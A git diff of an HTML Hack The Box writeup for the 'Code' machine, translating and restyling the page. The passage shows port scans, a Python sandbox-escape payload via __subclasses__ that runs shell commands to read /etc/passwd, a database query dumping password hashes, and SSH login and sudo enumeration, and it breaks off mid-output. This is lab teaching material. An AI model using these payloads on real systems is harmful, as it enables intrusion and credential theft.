@@ -3,393 +3,102 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta http-equiv="X-UA-Compatible" content="ie=edge">
   <title>Hack The Box :: Code Writeup — Hackthekat</title>
   <meta name="description" content="HTB Code machine writeup by Hackthekat">
   <link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet" type="text/css">
   <link rel="stylesheet" href="/main.css">
   <link rel="icon" type="image/png" href="/favicon.ico">
   <style>
-    /* ===== HTB WRITEUP PAGE ===== */
-    :root {
-      --htb-green: #9fef00;
-      --htb-green-soft: rgba(159,239,0,0.1);
-      --htb-bg: #0a0e14;
-      --htb-card: #11161d;
-      --htb-card-hover: #161c24;
-      --htb-border: #1f2832;
-      --htb-text: #c9d1d9;
-      --htb-muted: #6b7785;
-      --htb-easy: #9fef00;
-      --htb-medium: #ffaf00;
-      --htb-hard: #ff3838;
-      --htb-insane: #b372ff;
-      --htb-code-bg: #0d1117;
-    }
-
+    :root { --htb-green: #9fef00; --htb-bg: #0a0e14; --htb-card: #11161d; --htb-card-hover: #161c24; --htb-border: #1f2832; --htb-text: #c9d1d9; --htb-muted: #6b7785; --htb-easy: #9fef00; --htb-medium: #ffaf00; --htb-hard: #ff3838; --htb-insane: #b372ff; --htb-code-bg: #0d1117; }
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-
-    body {
-      background: var(--htb-bg);
-      color: var(--htb-text);
-      font-family: 'Inter', 'Segoe UI', system-ui, -apple-system, sans-serif;
-      font-size: 16px;
-      line-height: 1.7;
-      min-height: 100vh;
-    }
-
+    body { background: var(--htb-bg); color: var(--htb-text); font-family: 'Inter','Segoe UI', system-ui, sans-serif; font-size: 16px; line-height: 1.7; min-height: 100vh; }
     a { color: var(--htb-green); text-decoration: none; }
     a:hover { text-decoration: underline; }
-
-    /* ===== TOP NAV ===== */
-    .writeup-nav {
-      position: sticky;
-      top: 0;
-      z-index: 100;
-      background: rgba(10,14,20,0.95);
-      backdrop-filter: blur(10px);
-      border-bottom: 1px solid var(--htb-border);
-      padding: 0.9rem 2rem;
-      display: flex;
-      align-items: center;
-      gap: 1rem;
-    }
-    .writeup-nav .logo {
-      font-family: 'Monaco','Menlo','Courier New',monospace;
-      color: var(--htb-green);
-      font-size: 1.05rem;
-      font-weight: 700;
-      letter-spacing: 1px;
-    }
+    code { font-family: 'Monaco','Menlo',monospace; font-size: 0.88em; color: var(--htb-green); background: rgba(159,239,0,0.08); padding: 0.1em 0.35em; border-radius: 3px; }
+    .writeup-nav { position: sticky; top: 0; z-index: 100; background: rgba(10,14,20,0.95); backdrop-filter: blur(10px); border-bottom: 1px solid var(--htb-border); padding: 0.9rem 2rem; display: flex; align-items: center; gap: 1rem; }
+    .writeup-nav .logo { font-family: 'Monaco','Menlo',monospace; color: var(--htb-green); font-size: 1.05rem; font-weight: 700; letter-spacing: 1px; }
     .writeup-nav .logo span { color: #fff; }
     .nav-sep { color: var(--htb-muted); margin: 0 0.2rem; }
     .nav-breadcrumb { color: var(--htb-muted); font-size: 0.9rem; }
     .nav-breadcrumb a { color: var(--htb-muted); }
     .nav-breadcrumb a:hover { color: var(--htb-green); }
-
-    /* ===== HERO ===== */
-    .writeup-hero {
-      position: relative;
-      background: radial-gradient(ellipse at top, rgba(159,239,0,0.07), transparent 55%),
-                  linear-gradient(180deg, #0a0e14 0%, #0a0e14 100%);
-      padding: 4.5rem 2rem 3.5rem;
-      border-bottom: 1px solid var(--htb-border);
-      overflow: hidden;
-    }
-    .writeup-hero::before {
-      content: '';
-      position: absolute;
-      inset: 0;
-      background-image:
-        linear-gradient(rgba(159,239,0,0.025) 1px, transparent 1px),
-        linear-gradient(90deg, rgba(159,239,0,0.025) 1px, transparent 1px);
-      background-size: 40px 40px;
-      pointer-events: none;
-      mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%);
-      -webkit-mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%);
-    }
-    .writeup-hero-inner {
-      position: relative;
-      z-index: 1;
-      max-width: 860px;
-      margin: 0 auto;
-      text-align: center;
-    }
-    .writeup-hero-prompt {
-      font-family: 'Monaco','Menlo','Courier New',monospace;
-      color: var(--htb-green);
-      font-size: 0.9rem;
-      margin-bottom: 1.2rem;
-      opacity: 0.8;
-    }
+    .writeup-hero { position: relative; background: radial-gradient(ellipse at top, rgba(159,239,0,0.07), transparent 55%); padding: 4.5rem 2rem 3.5rem; border-bottom: 1px solid var(--htb-border); overflow: hidden; }
+    .writeup-hero::before { content: ''; position: absolute; inset: 0; background-image: linear-gradient(rgba(159,239,0,0.025) 1px, transparent 1px), linear-gradient(90deg, rgba(159,239,0,0.025) 1px, transparent 1px); background-size: 40px 40px; pointer-events: none; mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%); -webkit-mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%); }
+    .writeup-hero-inner { position: relative; z-index: 1; max-width: 860px; margin: 0 auto; text-align: center; }
+    .writeup-hero-prompt { font-family: 'Monaco','Menlo',monospace; color: var(--htb-green); font-size: 0.9rem; margin-bottom: 1.2rem; opacity: 0.8; }
     .writeup-hero-prompt::before { content: '> '; }
-    .writeup-hero h1 {
-      font-size: 3.5rem;
-      font-weight: 700;
-      color: #fff;
-      letter-spacing: -1.5px;
-      line-height: 1.1;
-      margin-bottom: 1.2rem;
-    }
+    .writeup-hero h1 { font-size: 3.5rem; font-weight: 700; color: #fff; letter-spacing: -1.5px; line-height: 1.1; margin-bottom: 1.2rem; }
     .writeup-hero h1 .accent { color: var(--htb-green); }
-    .writeup-badges {
-      display: flex;
-      justify-content: center;
-      gap: 0.6rem;
-      flex-wrap: wrap;
-      margin-bottom: 1.5rem;
-    }
-    .htb-badge {
-      font-size: 0.72rem;
-      padding: 0.25rem 0.75rem;
-      border-radius: 4px;
-      font-weight: 700;
-      text-transform: uppercase;
-      letter-spacing: 0.8px;
-      font-family: 'Monaco','Menlo',monospace;
-    }
+    .writeup-badges { display: flex; justify-content: center; gap: 0.6rem; flex-wrap: wrap; margin-bottom: 1.5rem; }
+    .htb-badge { font-size: 0.72rem; padding: 0.25rem 0.75rem; border-radius: 4px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.8px; font-family: 'Monaco','Menlo',monospace; }
     .os-linux { background: rgba(159,239,0,0.12); color: var(--htb-green); border: 1px solid rgba(159,239,0,0.35); }
     .os-windows { background: rgba(0,153,255,0.12); color: #0099ff; border: 1px solid rgba(0,153,255,0.35); }
     .diff-easy { background: rgba(159,239,0,0.12); color: var(--htb-easy); border: 1px solid rgba(159,239,0,0.35); }
     .diff-medium { background: rgba(255,175,0,0.12); color: var(--htb-medium); border: 1px solid rgba(255,175,0,0.35); }
     .diff-hard { background: rgba(255,56,56,0.12); color: var(--htb-hard); border: 1px solid rgba(255,56,56,0.35); }
     .diff-insane { background: rgba(179,114,255,0.12); color: var(--htb-insane); border: 1px solid rgba(179,114,255,0.35); }
-    .writeup-hero-tagline {
-      color: var(--htb-muted);
-      font-size: 0.95rem;
-      font-family: 'Monaco','Menlo',monospace;
-    }
-
-    /* ===== LAYOUT ===== */
-    .writeup-layout {
-      max-width: 860px;
-      margin: 0 auto;
-      padding: 3rem 2rem 5rem;
-    }
-
-    /* ===== CONTENT TYPOGRAPHY ===== */
-    .writeup-body p {
-      color: var(--htb-text);
-      margin: 1rem 0;
-      line-height: 1.75;
-    }
-    .writeup-body h2.writeup-section-title {
-      font-size: 1.75rem;
-      font-weight: 700;
-      color: #fff;
-      margin: 3rem 0 1rem;
-      padding-bottom: 0.6rem;
-      border-bottom: 1px solid var(--htb-border);
-      letter-spacing: -0.3px;
-    }
-    .writeup-body h2.writeup-section-title::before {
-      content: '# ';
-      color: var(--htb-green);
-      font-family: 'Monaco','Menlo',monospace;
-      font-size: 1.1rem;
-    }
-    .writeup-body h3.writeup-sub-title {
-      font-size: 1.2rem;
-      font-weight: 600;
-      color: #e6edf3;
-      margin: 2rem 0 0.75rem;
-    }
-    .writeup-body h3.writeup-sub-title::before {
-      content: '## ';
-      color: var(--htb-green);
-      font-family: 'Monaco','Menlo',monospace;
-      font-size: 0.85rem;
-      opacity: 0.7;
-    }
-    .writeup-body h4.writeup-step-title {
-      font-size: 1rem;
-      font-weight: 600;
-      color: var(--htb-green);
-      margin: 1.5rem 0 0.5rem;
-      font-family: 'Monaco','Menlo',monospace;
-      letter-spacing: 0.3px;
-    }
+    .writeup-hero-tagline { color: var(--htb-muted); font-size: 0.95rem; font-family: 'Monaco','Menlo',monospace; }
+    .writeup-layout { max-width: 860px; margin: 0 auto; padding: 3rem 2rem 5rem; }
+    .writeup-body p { color: var(--htb-text); margin: 1rem 0; line-height: 1.75; }
+    .writeup-body h2.writeup-section-title { font-size: 1.75rem; font-weight: 700; color: #fff; margin: 3rem 0 1rem; padding-bottom: 0.6rem; border-bottom: 1px solid var(--htb-border); letter-spacing: -0.3px; }
+    .writeup-body h2.writeup-section-title::before { content: '# '; color: var(--htb-green); font-family: 'Monaco','Menlo',monospace; font-size: 1.1rem; }
+    .writeup-body h3.writeup-sub-title { font-size: 1.2rem; font-weight: 600; color: #e6edf3; margin: 2rem 0 0.75rem; }
+    .writeup-body h3.writeup-sub-title::before { content: '## '; color: var(--htb-green); font-family: 'Monaco','Menlo',monospace; font-size: 0.85rem; opacity: 0.7; }
+    .writeup-body h4.writeup-step-title { font-size: 1rem; font-weight: 600; color: var(--htb-green); margin: 1.5rem 0 0.5rem; font-family: 'Monaco','Menlo',monospace; letter-spacing: 0.3px; }
     .writeup-body h4.writeup-step-title::before { content: '→ '; opacity: 0.7; }
-
-    /* ===== CODE BLOCKS ===== */
-    .code-block {
-      background: var(--htb-code-bg);
-      border: 1px solid var(--htb-border);
-      border-radius: 8px;
-      margin: 1.2rem 0;
-      overflow: hidden;
-      position: relative;
-    }
-    .code-block::before {
-      content: '';
-      display: block;
-      height: 3px;
-      background: linear-gradient(90deg, var(--htb-green), transparent);
-    }
-    .code-block pre {
-      padding: 1.2rem 1.5rem;
-      overflow-x: auto;
-      margin: 0;
-    }
-    .code-block pre code {
-      font-family: 'Monaco','Menlo','Courier New',monospace;
-      font-size: 0.82rem;
-      color: #e6edf3;
-      line-height: 1.6;
-      white-space: pre;
-    }
-
-    /* ===== SCREENSHOTS ===== */
-    .screenshot-wrap {
-      margin: 1.5rem 0;
-      background: var(--htb-card);
-      border: 1px solid var(--htb-border);
-      border-radius: 8px;
-      overflow: hidden;
-    }
-    .screenshot-wrap img {
-      width: 100%;
-      height: auto;
-      display: block;
-    }
-    .img-caption {
-      display: block;
-      padding: 0.5rem 1rem;
-      font-size: 0.8rem;
-      color: var(--htb-muted);
-      font-style: italic;
-      border-top: 1px solid var(--htb-border);
-    }
-
-    /* ===== FLAG BOXES ===== */
-    .flag-box {
-      background: rgba(159,239,0,0.06);
-      border: 1px solid rgba(159,239,0,0.3);
-      border-left: 4px solid var(--htb-green);
-      border-radius: 8px;
-      padding: 1rem 1.5rem;
-      margin: 1.5rem 0;
-      display: flex;
-      align-items: center;
-      gap: 1rem;
-      flex-wrap: wrap;
-    }
-    .flag-label {
-      font-size: 0.85rem;
-      font-weight: 700;
-      color: var(--htb-green);
-      font-family: 'Monaco','Menlo',monospace;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-      white-space: nowrap;
-    }
-    .flag-value {
-      font-family: 'Monaco','Menlo',monospace;
-      font-size: 0.8rem;
-      color: #e6edf3;
-      background: rgba(0,0,0,0.3);
-      padding: 0.2rem 0.6rem;
-      border-radius: 4px;
-      word-break: break-all;
-    }
-
-    /* ===== ROOTED BOX ===== */
-    .rooted-box {
-      background: rgba(159,239,0,0.08);
-      border: 1px solid var(--htb-green);
-      border-radius: 8px;
-      padding: 1.2rem 1.5rem;
-      margin: 2rem 0;
-      text-align: center;
-      font-size: 1.2rem;
-      font-weight: 700;
-      color: var(--htb-green);
-      font-family: 'Monaco','Menlo',monospace;
-      letter-spacing: 1px;
-    }
-
-    /* ===== INFO CARD (Machine Info) ===== */
-    .machine-info-card {
-      background: var(--htb-card);
-      border: 1px solid var(--htb-border);
-      border-radius: 12px;
-      padding: 1.5rem 2rem;
-      margin: 0 0 2.5rem 0;
-    }
-    .machine-info-card table {
-      width: 100%;
-      border-collapse: collapse;
-    }
-    .machine-info-card td {
-      padding: 0.4rem 1rem 0.4rem 0;
-      color: var(--htb-text);
-      font-size: 0.9rem;
-      vertical-align: top;
-    }
-    .machine-info-card td:first-child {
-      color: var(--htb-muted);
-      font-family: 'Monaco','Menlo',monospace;
-      font-size: 0.82rem;
-      white-space: nowrap;
-      width: 130px;
-    }
-
-    /* ===== BACK BUTTON ===== */
-    .back-link {
-      display: inline-flex;
-      align-items: center;
-      gap: 0.5rem;
-      color: var(--htb-muted);
-      font-size: 0.9rem;
-      font-family: 'Monaco','Menlo',monospace;
-      margin-bottom: 2.5rem;
-      transition: color 0.2s;
-    }
+    .code-block { background: var(--htb-code-bg); border: 1px solid var(--htb-border); border-radius: 8px; margin: 1.2rem 0; overflow: hidden; position: relative; }
+    .code-block::before { content: ''; display: block; height: 3px; background: linear-gradient(90deg, var(--htb-green), transparent); }
+    .code-block pre { padding: 1.2rem 1.5rem; overflow-x: auto; margin: 0; }
+    .code-block pre code { font-family: 'Monaco','Menlo',monospace; font-size: 0.82rem; color: #e6edf3; line-height: 1.6; white-space: pre; background: none; padding: 0; }
+    .screenshot-wrap { margin: 1.5rem 0; background: var(--htb-card); border: 1px solid var(--htb-border); border-radius: 8px; overflow: hidden; }
+    .screenshot-wrap img { width: 100%; height: auto; display: block; }
+    .img-caption { display: block; padding: 0.5rem 1rem; font-size: 0.8rem; color: var(--htb-muted); font-style: italic; border-top: 1px solid var(--htb-border); }
+    .flag-box { background: rgba(159,239,0,0.06); border: 1px solid rgba(159,239,0,0.3); border-left: 4px solid var(--htb-green); border-radius: 8px; padding: 1rem 1.5rem; margin: 1.5rem 0; display: flex; align-items: center; gap: 1rem; flex-wrap: wrap; }
+    .flag-label { font-size: 0.85rem; font-weight: 700; color: var(--htb-green); font-family: 'Monaco','Menlo',monospace; text-transform: uppercase; letter-spacing: 0.5px; white-space: nowrap; }
+    .flag-value { font-family: 'Monaco','Menlo',monospace; font-size: 0.8rem; color: #e6edf3; background: rgba(0,0,0,0.3); padding: 0.2rem 0.6rem; border-radius: 4px; word-break: break-all; }
+    .rooted-box { background: rgba(159,239,0,0.08); border: 1px solid var(--htb-green); border-radius: 8px; padding: 1.2rem 1.5rem; margin: 2rem 0; text-align: center; font-size: 1.2rem; font-weight: 700; color: var(--htb-green); font-family: 'Monaco','Menlo',monospace; letter-spacing: 1px; }
+    .back-link { display: inline-flex; align-items: center; gap: 0.5rem; color: var(--htb-muted); font-size: 0.9rem; font-family: 'Monaco','Menlo',monospace; margin-bottom: 2.5rem; transition: color 0.2s; }
     .back-link:hover { color: var(--htb-green); text-decoration: none; }
-    .back-link::before { content: '←'; }
-
-    /* ===== RESPONSIVE ===== */
-    @media (max-width: 768px) {
-      .writeup-hero h1 { font-size: 2.4rem; }
-      .writeup-layout { padding: 2rem 1.2rem 4rem; }
-      .writeup-nav { padding: 0.8rem 1.2rem; }
-    }
+    .back-link::before { content: '← '; }
+    @media (max-width: 768px) { .writeup-hero h1 { font-size: 2.4rem; } .writeup-layout { padding: 2rem 1.2rem 4rem; } .writeup-nav { padding: 0.8rem 1.2rem; } }
   </style>
 </head>
 <body>
-
-  <!-- Navigation -->
   <nav class="writeup-nav">
     <a href="/" class="logo">> <span>hackthekat</span></a>
     <span class="nav-sep">/</span>
-    <span class="nav-breadcrumb">
-      <a href="/writeups/">writeups</a>
-      <span class="nav-sep">/</span>
-      code
-    </span>
+    <span class="nav-breadcrumb"><a href="/writeups/">writeups</a><span class="nav-sep">/</span>code</span>
   </nav>
-
-  <!-- Hero -->
   <div class="writeup-hero">
     <div class="writeup-hero-inner">
       <div class="writeup-hero-prompt">hackthekat — writeup</div>
       <h1>Hack The Box: <span class="accent">Code</span></h1>
       <div class="writeup-badges">
         <span class="htb-badge os-linux">Linux</span>
-        <span class="htb-badge diff-medium">Easy</span>
+        <span class="htb-badge diff-medium">Medium</span>
       </div>
       <div class="writeup-hero-tagline">Penetration Testing Writeup</div>
     </div>
   </div>
-
-  <!-- Main Content -->
   <div class="writeup-layout">
-    <a href="/writeups/" class="back-link"> Back to all writeups</a>
-
+    <a href="/writeups/" class="back-link">Back to all writeups</a>
     <div class="writeup-body">
-      <div class="machine-info-card">
-        <table>
-          <tr><td>Machine</td><td><strong>Code</strong></td></tr>
-          <tr><td>Difficulty</td><td><span class="htb-badge diff-easy">Easy</span></td></tr>
-          <tr><td>OS</td><td><span class="htb-badge os-linux">Linux</span></td></tr>
-        </table>
-      </div>
+      <h2 class="writeup-section-title">Machine Overview</h2>
+      <p>Code is a Medium difficulty Linux machine featuring a <strong>Python code editor</strong> web application. The editor allows arbitrary Python execution, which can be leveraged to read system files and dump database credentials. After cracking the password hashes, SSH access is obtained. Privilege escalation exploits a <code>sudo</code> misconfiguration with a custom backup script (<code>backy.sh</code>) that allows reading arbitrary files as root through crafted JSON task definitions.</p>
       <h2 class="writeup-section-title">Initial Enumeration</h2>
       <h3 class="writeup-sub-title">Port Scanning</h3>
-      <h4 class="writeup-step-title">Full Port scan</h4>
-      <p>As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.</p>
+      <p>I start with a full TCP port scan to identify all open ports.</p>
       <div class="code-block"><pre><code>nmap -p- 10.129.37.223
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-24 22:24 CET
 Nmap scan report for 10.129.37.223
 Host is up (0.025s latency).
 Not shown: 65533 closed tcp ports (reset)
-PORT STATE SERVICE
-22/tcp open ssh
-5000/tcp open upnp
+PORT     STATE SERVICE
+22/tcp   open  ssh
+5000/tcp open  upnp
 
 Nmap done: 1 IP address (1 host up) scanned in 14.10 seconds</code></pre></div>
-      <h4 class="writeup-step-title">Detailed port scan</h4>
-      <p>At the detailed port scan go to get more information from the services that are open the ip address.</p>
+      <p>A detailed scan on the discovered ports reveals SSH on port 22 and an HTTP service on port 5000.</p>
       <div class="code-block"><pre><code>nmap -p22,5000 -sCV 10.129.37.223 -vvvv
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-24 22:25 CET
 NSE: Loaded 157 scripts for scanning.
@@ -431,18 +140,18 @@ Nmap scan report for 10.129.37.223
 Host is up, received echo-reply ttl 63 (0.021s latency).
 Scanned at 2025-03-24 22:25:24 CET for 9s
 
-PORT STATE SERVICE REASON VERSION
-22/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
+PORT     STATE SERVICE REASON         VERSION
+22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
-| 3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
+|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
 | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCrE0z9yLzAZQKDE2qvJju5kq0jbbwNh6GfBrBu20em8SE/I4jT4FGig2hz6FHEYryAFBNCwJ0bYHr3hH9IQ7ZZNcpfYgQhi8C+QLGg+j7U4kw4rh3Z9wbQdm9tsFrUtbU92CuyZKpFsisrtc9e7271kyJElcycTWntcOk38otajZhHnLPZfqH90PM+ISA93hRpyGyrxj8phjTGlKC1O0zwvFDn8dqeaUreN7poWNIYxhJ0ppfFiCQf3rqxPS1fJ0YvKcUeNr2fb49H6Fba7FchR8OYlinjJLs1dFrx0jNNW/m3XS3l2+QTULGxM5cDrKip2XQxKfeTj4qKBCaFZUzknm27vHDW3gzct5W0lErXbnDWQcQZKjKTPu4Z/uExpJkk1rDfr3JXoMHaT4zaOV9l3s3KfrRSjOrXMJIrImtQN1l08nzh/Xg7KqnS1N46PEJ4ivVxEGFGaWrtC1MgjMZ6FtUSs/8RNDn59Pxt0HsSr6rgYkZC2LNwrgtMyiiwyas=
-| 256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
+|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
 | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDiXZTkrXQPMXdU8ZTTQI45kkF2N38hyDVed+2fgp6nB3sR/mu/7K4yDqKQSDuvxiGe08r1b1STa/LZUjnFCfgg=
-| 256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
+|   256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
 |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP8Cwf2cBH9EDSARPML82QqjkV811d+Hsjrly11/PHfu
-5000/tcp open http syn-ack ttl 63 Gunicorn 20.0.4
+5000/tcp open  http    syn-ack ttl 63 Gunicorn 20.0.4
 | http-methods: 
-|_ Supported Methods: HEAD GET OPTIONS
+|_  Supported Methods: HEAD GET OPTIONS
 |_http-title: Python Code Editor
 |_http-server-header: gunicorn/20.0.4
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
@@ -460,19 +169,24 @@ Completed NSE at 22:25, 0.00s elapsed
 Read data files from: /usr/share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 9.08 seconds
- Raw packets sent: 6 (240B) | Rcvd: 3 (116B)</code></pre></div>
-      <p>Now I am ik dus naar de webpage geweest en heb ik gezien dat de webpage een Python
-Code Editor is. I have dus will look at of dat ik dit niet kan gebruiken, of dat ik het &quot;/etcc/passwd&quot; path niet kan afprinten door the following command te will use.</p>
+           Raw packets sent: 6 (240B) | Rcvd: 3 (116B)</code></pre></div>
+      <h2 class="writeup-section-title">Foothold: Python Code Editor RCE</h2>
+      <h3 class="writeup-sub-title">Discovering the Code Editor</h3>
+      <p>The web application on port 5000 hosts a <strong>Python Code Editor</strong> — a browser-based tool that executes Python code server-side and returns the output. This is essentially a free Remote Code Execution (RCE) endpoint if not properly sandboxed.</p>
+      <h3 class="writeup-sub-title">Reading System Files</h3>
+      <p>I test whether I can break out of the editor's sandbox by using Python's <code>__subclasses__</code> introspection to access the <code>subprocess</code> module and execute system commands. The payload reads <code>/etc/passwd</code> to enumerate system users.</p>
       <div class="code-block"><pre><code>print(object.__subclasses__()[317](&quot;cat /etc/passwd&quot;, shell=True, stdout=-1).communicate())print(object.__subclasses__()[317](&quot;cat /etc/passwd&quot;, shell=True, stdout=-1).communicate())
 
 (b&#x27;root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:106::/nonexistent:/usr/sbin/nologin\nsyslog:x:104:110::/home/syslog:/usr/sbin/nologin\n_apt:x:105:65534::/nonexistent:/usr/sbin/nologin\ntss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false\nuuidd:x:107:112::/run/uuidd:/usr/sbin/nologin\ntcpdump:x:108:113::/nonexistent:/usr/sbin/nologin\nlandscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin\npollinate:x:110:1::/var/cache/pollinate:/bin/false\nfwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin\nusbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\nsshd:x:113:65534::/run/sshd:/usr/sbin/nologin\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\nlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false\napp-production:x:1001:1001:,,,:/home/app-production:/bin/bash\nmartin:x:1000:1000:,,,:/home/martin:/bin/bash\n_laurel:x:997:997::/var/log/laurel:/bin/false\n&#x27;, None)</code></pre></div>
-      <p>You can above de output zien van de code die dat ik zonet heb ingegeven. Now I will I will zien of er geen password hashes zijn die dat gedumped kunnen worden so that ik deze dan met een john of een hashcat kan gaan decrypteren. Voor de password hashes te dumpen heb ik the following command gebruikt.</p>
+      <h3 class="writeup-sub-title">Dumping Database Credentials</h3>
+      <p>Since the code editor is a Flask application, I attempt to dump user credentials from the application's database by querying the ORM directly. This reveals two user accounts with their password hashes.</p>
       <div class="code-block"><pre><code>print([(user.id, user.username, user.password) for user in User.query.all()])
 
 [(1, &#x27;development&#x27;, &#x27;759b74ce43947f5f4c91aeddc3e5bad3&#x27;), (2, &#x27;martin&#x27;, &#x27;3de6f30c4a09c27fc71932bfc68474be&#x27;)]</code></pre></div>
-      <p>Zoals je above zult kunnen zien zijn er 2 verschillende hashes gevonden, I will voor het mijzelf gemakkelijk te maken en tijd te besparen zal ik de volgende hashes in crackstation will put. I will below de hashes zetten dat we zonet hebben gecracked.</p>
-      <p>I will nu een keer de usernames en de passworden will try testen voor binnen te geraken op de ssh server. Zoals je below zult kunnen zien ben ik kunnen inloggen als de user martin op de ssh server.</p>
-      <div class="code-block"><pre><code>ssh martin@10.129.37.223 
+      <p>Two hashes were found. I paste them into <strong>CrackStation</strong> (an online hash-cracking service) to save time, and both hashes are successfully cracked.</p>
+      <h3 class="writeup-sub-title">SSH Access as martin</h3>
+      <p>I test the discovered credentials against the SSH server and successfully log in as the user <code>martin</code>.</p>
+      <div class="code-block"><pre><code>ssh martin@10.129.37.223                                                        
 The authenticity of host &#x27;10.129.37.223 (10.129.37.223)&#x27; can&#x27;t be established.
 ED25519 key fingerprint is SHA256:AlQsgTPYThQYa3z9ZAHkFiO/LqXA6T55FoT58A1zlAY.
 This key is not known by any other names.
@@ -481,20 +195,20 @@ Warning: Permanently added &#x27;10.129.37.223&#x27; (ED25519) to the list of kn
 martin@10.129.37.223&#x27;s password: 
 Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)
 
- * Documentation: https://help.ubuntu.com
- * Management: https://landscape.canonical.com
- * Support: https://ubuntu.com/pro
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
 
  System information as of Mon 24 Mar 2025 04:15:46 PM UTC
 
- System load: 0.09
- Usage of /: 51.0% of 5.33GB
- Memory usage: 13%
- Swap usage: 0%
- Processes: 232
- Users logged in: 0
- IPv4 address for eth0: 10.129.37.223
- IPv6 address for eth0: dead:beef::250:56ff:fe94:626f
+  System load:           0.09
+  Usage of /:            51.0% of 5.33GB
+  Memory usage:          13%
+  Swap usage:            0%
+  Processes:             232
+  Users logged in:       0
+  IPv4 address for eth0: 10.129.37.223
+  IPv6 address for eth0: dead:beef::250:56ff:fe94:626f
 
 
 Expanded Security Maintenance for Applications is not enabled.
@@ -513,42 +227,46 @@ applicable law.
 
 Last login: Mon Mar 24 16:15:47 2025 from 10.10.16.22
 martin@code:~$</code></pre></div>
-      <p>I have eerst will look at of dat er in de user martin een user.txt file was, maar dit was niet het geval. Binnen martin was er een &quot;.tar.bz2&quot; en een &quot;.json&quot; file.</p>
+      <h2 class="writeup-section-title">User Flag: Backup Script Abuse</h2>
+      <h3 class="writeup-sub-title">Exploring martin's Home Directory</h3>
+      <p>Martin's home directory does not contain a <code>user.txt</code> file directly. Instead, I find a <code>.tar.bz2</code> archive and a <code>.json</code> file in the backups folder.</p>
       <div class="code-block"><pre><code>martin@code:~/backups$ ls
-code_home_app-production_app_2024_August.tar.bz2 task.json</code></pre></div>
-      <p>I have dus First het sudo -l commando will execute voor het zien of dat er niet iets is dat ik kan gaan abuse zonder de password van de root user nodig te moeten hebben. You can below zien dat het backy.sh script gebruikt kan worden zonder root permissions.</p>
+code_home_app-production_app_2024_August.tar.bz2  task.json</code></pre></div>
+      <h3 class="writeup-sub-title">Sudo Enumeration</h3>
+      <p>Running <code>sudo -l</code> reveals that martin can execute <code>/usr/bin/backy.sh</code> as root without a password. This is a custom backup script owned by root.</p>
       <div class="code-block"><pre><code>martin@code:~/backups$ sudo -l
 Matching Defaults entries for martin on localhost:
- env_reset, mail_badpass,
